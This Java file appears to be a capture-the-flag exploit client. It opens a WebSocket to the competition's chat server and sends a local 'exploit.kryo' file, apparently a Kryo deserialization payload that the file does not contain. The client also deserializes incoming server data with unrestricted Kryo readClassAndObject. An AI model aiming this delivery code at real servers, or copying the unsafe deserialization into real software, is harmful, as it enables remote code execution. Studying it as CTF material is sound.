package ru.mctf.chat.client;

import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.ByteBufferInput;
import com.esotericsoftware.kryo.io.Input;
import com.esotericsoftware.kryo.io.Output;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.WebSocketHttpHeaders;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.client.standard.StandardWebSocketClient;
import org.springframework.web.socket.handler.BinaryWebSocketHandler;
import ru.mctf.chat.message.ChatMessage;
import ru.mctf.chat.message.ChatMessageComponent;
import ru.mctf.chat.message.ChatMessageComponentType;
import ru.mctf.chat.message.ErrorMessage;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutionException;

public class ChatClient extends BinaryWebSocketHandler {

    private WebSocketSession wsSession;

    private final Kryo kryo = new Kryo();

    public static void main(String[] args) throws Exception {
        ChatClient client = new ChatClient();

        client.run();
        System.in.read();
    }

    public void run() throws ExecutionException, InterruptedException, IOException {
        StandardWebSocketClient wsClient = new StandardWebSocketClient();
        wsSession = wsClient.doHandshake(this, new WebSocketHttpHeaders(), URI.create("ws://chat.mctf.online")).get();

        wsSession.sendMessage(new BinaryMessage(Files.readAllBytes(new File("exploit.kryo").toPath())));
    }

    @Override
    protected void handleBinaryMessage(WebSocketSession session, BinaryMessage message) {
        Input input = new ByteBufferInput(message.getPayload());
        Object decoded = kryo.readClassAndObject(input);

        if (decoded instanceof ChatMessage) {
            System.out.println(decoded);
        } else if (decoded instanceof ErrorMessage) {
            ErrorMessage errorMessage = (ErrorMessage) decoded;
            System.out.println(errorMessage.getMessage());
        }
    }
}
